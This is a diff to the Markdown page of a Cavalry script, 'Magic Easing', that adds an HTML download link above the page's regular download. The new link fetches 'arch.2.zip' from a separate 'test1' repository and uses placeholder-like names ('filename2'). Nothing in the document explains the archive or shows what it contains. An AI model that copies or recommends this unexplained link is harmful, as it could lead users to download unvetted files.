@@ -6,6 +6,8 @@ permalink: /scripts/magic-easing/
 
 # Magic Easing
 
+<a href="https://github.com/yevgenymakarov/test1/releases/download/v1.x/arch.2.zip" download="filename2">filename2.zip</a>
+
 > Version 1.2.0
 > Supports Cavalry 2.6.0 and later.
 > **[Free Download](https://github.com/yevgenymakarov/yevgenymakarov.github.io/releases/download/v1/Magic.Easing.zip "Download the zip file")**
